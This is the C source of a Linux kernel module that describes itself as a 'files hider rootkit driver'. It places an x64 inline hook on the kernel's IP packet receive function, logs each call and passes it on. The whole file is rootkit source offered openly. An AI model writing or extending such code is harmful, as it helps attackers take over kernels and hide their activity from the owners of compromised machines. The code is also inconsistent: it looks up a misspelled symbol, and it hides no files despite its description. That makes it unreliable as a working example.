

#include "hfiles/pch.h" /* precompiled header */ 

#include "hfiles/utils64.h"
#include "hfiles/inlHook.h"
#include "hfiles/typedefs.h"


int (*fp_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
	   struct net_device *orig_dev); 

unsigned long addr;
int my_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
    inline_unhook_x64(); 
    
    printk(KERN_INFO "hooked"); 
    
    fp_ip_rcv(skb, dev, pt, orig_dev); 

    inline_hook_x64(fp_ip_rcv, my_ip_rcv); 
    return 1; 
}

static int __init rootkit_init(void) {

    addr = dumpAddr("ip_recv"); 
    fp_ip_rcv = (unsigned long)addr; 

    inline_hook_x64(fp_ip_rcv, my_ip_rcv); 

    return 0; 
}

static void __exit rootkit_exit(void) 
{
    inline_unhook_x64();     
}
MODULE_LICENSE("GPL");
MODULE_AUTHOR("dan0xcc");
MODULE_DESCRIPTION("files hider rootkit driver"); 
MODULE_VERSION("1.00");


module_init(rootkit_init); // invokes loading 
module_exit(rootkit_exit); // invokes unloading 



